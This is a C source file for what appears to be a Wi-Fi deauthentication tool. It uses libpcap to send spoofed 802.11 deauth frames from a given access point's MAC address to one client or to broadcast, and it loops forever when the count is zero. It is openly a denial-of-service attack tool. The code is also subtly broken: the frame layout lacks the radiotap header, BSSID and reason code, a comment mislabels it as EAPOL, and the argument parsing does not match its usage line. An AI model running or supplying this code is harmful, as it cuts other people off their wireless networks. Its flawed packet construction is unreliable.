#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DEAUTH_FRAME_SIZE 24

// EAPOL Deauthentication frame
unsigned char deauth_frame[] = {
    0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void send_deauth(pcap_t *handle, unsigned char *ap_mac, unsigned char *client_mac, int count) {
    unsigned char frame[DEAUTH_FRAME_SIZE];
    memset(frame, 0, DEAUTH_FRAME_SIZE);

    // Set the frame type to Deauthentication (0xC0)
    frame[0] = 0xC0;

    // Set the destination MAC address (broadcast or specific client)
    memcpy(frame + 4, client_mac ? client_mac : "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Broadcast if no client MAC specified
    memcpy(frame + 10, ap_mac, 6);  // Set AP MAC as the source address

    // Sending the frame multiple times
    for (int i = 0; i < count || count == 0; i++) {
        if (pcap_sendpacket(handle, frame, DEAUTH_FRAME_SIZE) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
        }
        printf("Sending deauth packet #%d\n", i + 1);
        usleep(100000);  // Delay between packets
    }
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s --deauth <count> -a <AP_MAC> -c <CLIENT_MAC (optional)>\n", argv[0]);
        return 1;
    }

    int count = atoi(argv[2]);
    unsigned char ap_mac[6];
    unsigned char *client_mac = NULL;

    // Parse AP MAC address
    sscanf(argv[4], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &ap_mac[0], &ap_mac[1], &ap_mac[2], 
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);

    if (argc == 6) {
        // Parse client MAC address (optional)
        client_mac = malloc(6);
        sscanf(argv[5], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &client_mac[0], &client_mac[1], &client_mac[2], 
               &client_mac[3], &client_mac[4], &client_mac[5]);
    }

    // Open the device for raw socket communication
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("wlan0", 65536, 1, 1000, errbuf);  // Use your interface here
    if (handle == NULL) {
        fprintf(stderr, "Error opening device: %s\n", errbuf);
        return 1;
    }

    printf("Sending Deauth packets to AP: ");
    for (int i = 0; i < 6; i++) {
        printf("%02X", ap_mac[i]);
        if (i < 5) printf(":");
    }
    printf("\n");

    send_deauth(handle, ap_mac, client_mac, count);

    // Cleanup
    if (client_mac) free(client_mac);
    pcap_close(handle);
    return 0;
}
